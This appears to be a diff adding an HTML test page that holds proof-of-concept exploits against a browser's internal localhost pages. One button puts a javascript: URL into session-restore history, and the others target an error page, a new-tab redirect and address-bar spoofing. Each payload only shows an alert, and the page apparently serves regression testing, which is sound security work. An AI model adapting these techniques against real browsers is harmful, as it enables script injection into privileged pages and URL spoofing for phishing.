@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<head>
+<script>
+  var json = '{"history":["javascript:alert(\'Local page loaded\')"],"currentPage":-1}';
+  var sessionURL = 'http://localhost:6571/about/sessionrestore?history=' + escape(json);
+  var errorURL = 'http://localhost:6571/errors/error.html?url=nttps://mozilla.com/';
+
+  function newTabExploit() {
+    var win = window.open("http://1.2.3.4.5");
+    setTimeout(function () {
+      win.location.href = sessionURL;
+    }, 500);
+  }
+</script>
+</head>
+<body>
+  <button onclick="document.location=sessionURL">Session exploit</button>
+  <button onclick="window.open(errorURL)">Error exploit</button>
+  <button onclick="newTabExploit()">New tab exploit</button>
+  <button onclick="window.open('http://1.2.3.4:1234')">URL spoof</button>
+</body>
+</html>
